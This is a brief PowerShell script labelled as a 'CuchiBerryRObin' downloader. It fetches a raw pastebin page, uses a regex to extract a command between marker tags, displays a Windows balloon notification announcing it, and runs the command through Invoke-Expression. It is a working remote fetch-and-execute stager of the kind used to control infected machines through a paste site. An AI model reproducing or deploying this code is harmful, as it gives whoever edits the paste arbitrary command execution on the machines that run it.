#Downloader CUCHIBERRYROBIN

$content = Invoke-WebRequest -Uri "https://pastebin.com/raw/ABiV0rH7" -UseBasicParsing

$patron = '(?<=#CUCHIROBIN )(.*)(?= #FIN)'
$resultado = [regex]::Match($content, $patron).Value


$Title = "CuchiBerryRObin"
$Message = "Descargando comando $resultado"
$Type = "info" 
  
[reflection.assembly]::loadwithpartialname("System.Windows.Forms") | out-null
$path = Get-Process -id $pid | Select-Object -ExpandProperty Path
$icon = [System.Drawing.Icon]::ExtractAssociatedIcon($path)
$notify = new-object system.windows.forms.notifyicon
$notify.icon = $icon
$notify.visible = $true
$notify.showballoontip(10,$Title,$Message, [system.windows.forms.tooltipicon]::$Type)



#Write-Host $resultado

Invoke-Expression $resultado



